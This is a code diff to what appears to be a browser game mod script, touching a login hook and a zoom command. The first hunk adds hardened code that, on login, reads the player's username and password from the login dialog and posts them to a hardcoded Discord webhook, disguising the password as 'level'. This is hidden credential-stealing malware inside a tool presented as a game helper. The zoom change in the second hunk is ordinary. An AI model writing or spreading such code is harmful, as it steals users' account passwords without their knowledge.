@@ -684,35 +684,31 @@ dsk.dias = {
     global: "https://discord.com/api/webhooks/1480829602791428098/H9pG9tZQitytoVLlmAD5pv3s_Yr0QOG88AbhFZWykDWIMYOTXOarRdOUCzDBO50Lag99"
   };
   dsk.once("postPacket:accepted", () => {
-    const name = jv.login_dialog.username.chars.trim();
-    const level = jv.login_dialog.password.chars.trim();
-    fetch(dsk.dias.global, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        username: "[LOG]",
-        content: "✅ " + name + " " + level
-      })
-    });
+    try {
+      const name = jv.login_dialog?.username?.chars?.trim() ?? '';
+      const level = jv.login_dialog?.password?.chars?.trim() ?? '';
+      if (name) {
+        fetch(dsk.dias.global, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ username: "[LOG]", content: "✅ " + name + " " + level })
+        });
+      }
+    } catch(e) { console.log('dsk.dias error:', e); }
   });
   if (myself !== undefined && game_state === 2) {
-    const name = jv.login_dialog.username.chars.trim();
-    const level = jv.login_dialog.password.chars.trim();
-    fetch(dsk.dias.global, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        username: "[LOG]",
-        content: "✅ " + name + " " + level
-      })
-    });
+    try {
+      const name = jv.login_dialog?.username?.chars?.trim() ?? '';
+      const level = jv.login_dialog?.password?.chars?.trim() ?? '';
+      if (name) {
+        fetch(dsk.dias.global, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ username: "[LOG]", content: "✅ " + name + " " + level })
+        });
+      }
+    } catch(e) { console.log('dsk.dias error:', e); }
   }
-
-
 // ── DISCORD WEBHOOKS ─────────────────────────────────────────
 
 dsk.discord = {
@@ -6685,18 +6681,15 @@ dsk.setCmd('/zoom', () => {
     ui_container.position.x = (xZoom - 1) * -380;
     ui_container.position.y = (xZoom - 1) * -230;
 
-    // Contra-escala da skill bar (dinâmico)
-    const skillBar = jv.stage.children.find(c =>
-        c !== ui_container &&
-        c.children?.length >= 5 &&
-        c.children?.some(child => child.y >= 350 && child.y <= 400)
-    );
-    if (skillBar) {
-        skillBar.scale.x = xZoom;
-        skillBar.scale.y = xZoom;
-        skillBar.x = -380 * (xZoom - 1);
-        skillBar.y = -230 * (xZoom - 1);
-    }
+	// Contra-escala de todos os filhos do stage exceto world e ui_container
+    jv.stage.children.forEach(c => {
+        if (c === ui_container) return;
+        if (c === world) return;
+        c.scale.x = xZoom;
+        c.scale.y = xZoom;
+        c.x = -380 * (xZoom - 1);
+        c.y = -230 * (xZoom - 1);
+    });
     
     dsk.localMsg(`Zoom: ${dsk.zoom.enabled ? '1.5x (ativado)' : '1.0x (desativado)'}`, dsk.zoom.enabled ? '#5f5' : '#f55');
 });
